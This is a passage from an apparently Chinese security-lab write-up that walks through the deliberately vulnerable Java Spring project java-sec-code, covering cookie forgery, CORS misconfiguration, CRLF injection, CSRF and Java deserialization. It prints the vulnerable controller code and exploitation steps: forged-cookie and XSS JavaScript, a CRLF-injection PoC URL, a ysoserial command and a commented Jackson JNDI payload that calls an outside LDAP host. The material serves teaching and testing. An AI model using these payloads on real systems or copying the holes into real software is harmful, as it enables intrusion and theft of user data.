class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//遍历所有 cookie ，找 name 为 nick</span><br>            <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>                <span class="hljs-comment">// key code. Equals can also be equalsIgnoreCase.</span><br>                <span class="hljs-comment">//equals() 是大小写敏感</span><br>                <span class="hljs-keyword">if</span> (NICK.equals(cookie.getName())) &#123;<br>                    nick = cookie.getValue();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln04&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln04</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Cookie cookies[] = req.getCookies();<br>        <span class="hljs-keyword">if</span> (cookies != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>                <span class="hljs-comment">//使用 equalsIgnoreCase()，支持不区分大小写匹配 Cookie 名称。</span><br>                <span class="hljs-keyword">if</span> (cookie.getName().equalsIgnoreCase(NICK)) &#123;  <span class="hljs-comment">// key code</span><br>                    nick = cookie.getValue();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln05&quot;)</span><br>    <span class="hljs-comment">//使用 Spring 注解 @CookieValue(&quot;nick&quot;) 自动注入名为 nick 的 cookie 值。</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln05</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(&quot;nick&quot;)</span> String nick)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln06&quot;)</span><br>    <span class="hljs-comment">//和 vuln05 仅语法不同，功能完全一样。</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln06</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(value = &quot;nick&quot;)</span> String nick)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>vuln01</p><p><a href="http://127.0.0.1:8081/cookie/vuln01">http://127.0.0.1:8081/cookie/vuln01</a></p><p>抓包改 cookie，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Cookie: <span class="hljs-attribute">nick</span>=admin;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080930981.png" alt="20250723141110105"></p><p>vuln02</p><p>同 vuln01</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931435.png" alt="20250723141320799"></p><p>vuln03</p><p>因为大小写敏感，所以要写准确的 nick</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931594.png" alt="20250723141512271"></p><p>如果不是全小写，就会被拦截</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931715.png" alt="20250723141532175"></p><p>vuln04</p><p>不区分大小写，</p><p>vuln05</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 伪造一个 nick=admin 的 Cookie</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;nick=admin; path=/&quot;</span>;<br><br><span class="hljs-comment">// 发送请求，获取接口返回</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://127.0.0.1:8081/cookie/vuln05&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(text));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931254.png" alt="20250723142428662"></p><p>vuln06</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931560.png" alt="20250723142510453"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;nick=&lt;script&gt;alert(1)&lt;/script&gt;; path=/&quot;</span>;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://127.0.0.1:8081/cookie/vuln06&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(text));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931254.png"></p><h2 id="Cors"><a href="#Cors" class="headerlink" title="Cors"></a>Cors</h2><blockquote><p>跨域资源共享 CORS 详解</p><p><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p><h4 id="原理与工作流程"><a href="#原理与工作流程" class="headerlink" title="原理与工作流程"></a>原理与工作流程</h4><p>CORS（Cross-Origin Resource Sharing）跨源资源共享，是HTML5的一个新特性，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AJAX只能同源使用的限制。</p><p>CORS的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。</p><p>相比之下，CORS较JSONP更为复杂，JSONP只能用于获取资源（即只读，类似于GET请求），而CORS支持所有类型的HTTP请求，功能完善。</p><p>CORS具体工作流程可分为三步，</p><ol><li>资源服务器根据请求中Origin头返回访问控制策略(Access-Control-Allow-Origin响应头)，并在其中声明允许读取响应内容的源；</li><li>浏览器检查资源服务器在Access-Control-Allow-Origin头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许；</li></ol><h4 id="CORS与CSRF的区别"><a href="#CORS与CSRF的区别" class="headerlink" title="CORS与CSRF的区别"></a>CORS与CSRF的区别</h4><p>一般有CORS漏洞的地方都有CSRF。</p><p>CSRF一般使用form表单提交请求，而浏览器是不会对form表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。</p><p>浏览器的同源策略的本质是：一个域名的JS，在未经允许的情况下是不得读取另一个域名的内容，但浏览器并不阻止向另一个域名发送请求。</p><p>相同点：都需要第三方网站；都需要借助Ajax的异步加载过程；一般都需要用户登录目标站点。</p><p>不同点：一般CORS漏洞用于读取受害者的敏感信息，获取请求响应的内容；而CSRF则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。</p><p>由于代码限制不严格，会导致跨域请求伪造可以结合xss，csrf进行攻击</p></blockquote><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;Cors.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/cors&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cors</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;</span>;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/vuln/origin&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuls1</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">origin</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;origin&quot;</span>);<br>        <span class="hljs-comment">//后端无验证，直接将前端传来的 origin 反射回去，没有判断这个 origin 是否合法</span><br>        response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, origin); <span class="hljs-comment">// set origin from header</span><br>        <span class="hljs-comment">//可以在跨域请求中携带 Cookie / Session / Authorization 这些身份凭证</span><br>        response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);  <span class="hljs-comment">// allow cookie</span><br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/vuln/setHeader&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuls2</span><span class="hljs-params">(HttpServletResponse response)</span> &#123;<br>        <span class="hljs-comment">// 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常</span><br>        response.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>);<br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); //任意网站都可以访问本网站</code></p><p><code>response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  //允许这些任意网站带上用户的 Cookie 来访问本网站</code></p><p>这俩个头一起用就导致攻击者可以构造任意恶意网页，从任意网站带上 Cookie 访问本网站，获取到用户数据，造成数据泄露。</p><p><strong>漏洞利用：</strong></p><p>攻击者从 <code>evil.com</code> 发起跨域请求（使用前端脚本携带 Cookie 向另一个子域发请求），诱导已经在 <code>http://127.0.0.1:8081</code> 网站上登录的用户访问  <code>evil.com</code> ，而由于服务端设置了<code>response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</code>，所以当攻击者访问 <code>http://127.0.0.1:8081/cors/vuln/origin</code> 页面，服务端无过滤就会响应，使得攻击者拿到敏感信息。</p><p>cors复现: <a href="https://blog.csdn.net/wanmiqi/article/details/119573354">https://blog.csdn.net/wanmiqi/article/details/119573354</a></p><h2 id="CRLFInjection"><a href="#CRLFInjection" class="headerlink" title="CRLFInjection"></a>CRLFInjection</h2><blockquote><p>初识HTTP响应拆分攻击（CRLF Injection）</p><p><a href="https://www.anquanke.com/post/id/240014">https://www.anquanke.com/post/id/240014</a></p><p>CRLF 指的是<strong>回车符</strong>（CR，ASCII 13，\r，%0d）和<strong>换行符</strong>（LF，ASCII 10，\n，%0a）的简称（\r\n）。在《<a href="http://mp.weixin.qq.com/s?__biz=MzU2NzY5MjAwNQ==&mid=2247483836&idx=1&sn=1b1ccd6f196c87b7f3bf4b1c585d9d9e&chksm=fc981e36cbef972043707782aaa968ba94a960adba855a35afc5e896edeb2160d513ab1667cf&scene=21#wechat_redirect">HTTP | HTTP报文</a>》一文中，我们可以了解到HTTP报文的结构：HTTP报文以状态行开始，跟在后面的是HTTP首部（HTTP Header），首部由多个首部字段构成，每行一个首部字段，HTTP首部后是一个空行，然后是报文主体（HTTP Body）。状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。或者理解为首部中每个首部字段以一个CRLF分隔，首部和主体由两个CRLF分隔。</p><p>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些恶意的HTTP Header，如会话Cookie，甚至可以注入一些HTML代码。这就是CRLF注入漏洞的核心原理。</p><p>在实际应用中，如果Web应用没有对用户输入做严格验证，便会导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以CRLF注入漏洞又称为HTTP响应拆分漏洞（HTTP Response Splitting），简称HRS。</p></blockquote><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;CRLFInjection.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/crlf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CRLFInjection</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/safecode&quot;)</span><br>    <span class="hljs-comment">//表示该方法直接将返回结果写入 HTTP 响应体中</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-comment">//接收 HttpServletRequest request: 客户端发来的请求对象，HttpServletResponse response: 用于构造响应返回给客户端。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">crlf</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-comment">//将用户传入的 test1 作为值添加到响应头中</span><br>        response.addHeader(<span class="hljs-string">&quot;test1&quot;</span>, request.getParameter(<span class="hljs-string">&quot;test1&quot;</span>));<br>        <span class="hljs-comment">//设置 test2 响应头为请求参数 test2 的值。如果该 header 已存在，将被覆盖</span><br>        response.setHeader(<span class="hljs-string">&quot;test2&quot;</span>, request.getParameter(<span class="hljs-string">&quot;test2&quot;</span>));<br>        <span class="hljs-comment">//获取参数 test3 的值，赋给 author</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;test3&quot;</span>);<br>        <span class="hljs-comment">//创建一个新的 Cookie，名为 test3，值为 author</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;test3&quot;</span>, author);<br>        <span class="hljs-comment">//将该 Cookie 添加到响应头中</span><br>        response.addCookie(cookie);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>构造POC：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/crlf/safecode?test<span class="hljs-number">1</span><span class="hljs-operator">=</span>abc<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>ASet-Cookie:<span class="hljs-variable">%20</span>evil<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>正常来讲应该看到一个新的标头</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Set-Cookie: <span class="hljs-attribute">evil</span>=1<br></code></pre></td></tr></table></figure><p>我这里没有复现成功，可能是因为 tomcat 版本高自动过滤了 <code>\r\n</code> </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080933198.png" alt="20250723161852286"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">CSRF漏洞原理攻击与防御（非常细）-CSDN博客</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080933314.jpeg" alt="20250724095137238"></p><p>所以要被CSRF攻击，必须同时满足两个条件：</p><ul><li>登录受信任网站A，并在本地生成Cookie。</li><li>在不登出A的情况下，访问危险网站B。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/csrf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CSRF</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;form&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/post&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">post</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CSRF passed.&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Deserialize"><a href="#Deserialize" class="headerlink" title="Deserialize"></a>Deserialize</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> org.joychou.controller;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> org.joychou.config.Constants;<br><span class="hljs-keyword">import</span> org.joychou.security.AntObjectInputStream;<br><span class="hljs-keyword">import</span> org.slf4j.Logger;<br><span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.Cookie;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InvalidClassException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.springframework.web.util.WebUtils.getCookie;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Deserialize RCE using Commons-Collections gadget.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> JoyChou @2018-06-14</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/deserialize&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Deserialize</span> &#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64 &lt;br&gt;</span><br><span class="hljs-comment">     * &lt;a href=&quot;http://localhost:8080/deserialize/rememberMe/vuln&quot;&gt;http://localhost:8080/deserialize/rememberMe/vuln&lt;/a&gt;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/rememberMe/vuln&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">rememberMeVul</span><span class="hljs-params">(HttpServletRequest request)</span><br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//从请求中读取 rememberMe cookie</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(request, Constants.REMEMBER_ME_COOKIE);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//将 rememberMe cookie 中 Base64 编码的数据进行解码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);<br><br>        <span class="hljs-comment">//将 byte[] 包装成字节输入流</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decoded);<br>        <span class="hljs-comment">//构造 ObjectInputStream 对象，从流中读取对象，</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytes);<br>        <span class="hljs-comment">//读取字节流中的对象，进行反序列化，若 cookie 中包含恶意类，将被执行</span><br>        in.readObject();<br>        in.close();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Are u ok?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Check deserialize class using black list. &lt;br&gt;</span><br><span class="hljs-comment">     * Or update commons-collections to 3.2.2 or above.Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons.To enable it set system property &#x27;org.apache.commons.collections.enableUnsafeSerialization&#x27; to &#x27;true&#x27;,but you must ensure that your application does not de-serialize objects from untrusted sources.&lt;br&gt;</span><br><span class="hljs-comment">     * &lt;a href=&quot;http://localhost:8080/deserialize/rememberMe/security&quot;&gt;http://localhost:8080/deserialize/rememberMe/security&lt;/a&gt;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">//黑名单过滤</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/rememberMe/security&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">rememberMeBlackClassCheck</span><span class="hljs-params">(HttpServletRequest request)</span><br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(request, Constants.REMEMBER_ME_COOKIE);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decoded);<br><br>        <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//使用自定义 AntObjectInputStream 类进行反序列化。该类内部通过黑名单机制禁止一些已知的恶意类</span><br>            <span class="hljs-type">AntObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AntObjectInputStream</span>(bytes);  <span class="hljs-comment">// throw InvalidClassException</span><br>            in.readObject();<br>            in.close();<br>        &#125; <span class="hljs-keyword">catch</span> (InvalidClassException e) &#123;<br>            logger.info(e.toString());<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I&#x27;m very OK.&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// String payload = &quot;[\&quot;org.jsecurity.realm.jndi.JndiRealmFactory\&quot;, &#123;\&quot;jndiNames\&quot;:\&quot;ldap://30.196.97.50:1389/yto8pc\&quot;&#125;]&quot;;</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/jackson&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Jackson</span><span class="hljs-params">(String payload)</span> &#123;<br>        <span class="hljs-comment">//ObjectMapper 是 Jackson 提供的 JSON 解析器</span><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        mapper.enableDefaultTyping();<br>        <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//反序列化用户输入的 JSON </span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> mapper.readValue(payload, Object.class);<br>            mapper.writeValueAsString(obj);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>ysoserial.jar 生成 payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">路由：<br>/deserialize/rememberMe/vuln<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Windows：<br><br>java -jar 